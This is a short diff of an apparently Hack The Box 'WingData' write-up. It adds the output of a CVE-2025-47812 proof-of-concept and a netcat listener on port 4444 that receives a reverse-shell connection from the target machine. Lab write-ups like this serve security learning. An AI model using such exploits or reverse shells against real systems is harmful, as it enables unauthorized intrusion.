@@ -589,6 +589,13 @@ Output:
 [+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: bd0319a294e1a9b234377e194ed1ec64f528764d624db129b32c21fbca0cb8d6
 [-] Error sending GET request to http://ftp.wingdata.htb/dir.html: HTTPConnectionPool(host='ftp.wingdata.htb', port=80): Read timed out. (read timeout=10)
 ```
+
+```
+┌──(kali㉿kali)-[~/pueman/HTB/WingData/CVE-2025-47812-poc]
+└─$ nc -lvnp 4444               
+listening on [any] 4444 ...
+connect to [10.10.14.247] from (UNKNOWN) [10.129.9.90] 54034
+```
 <div align="center">
 <br>
 <br>
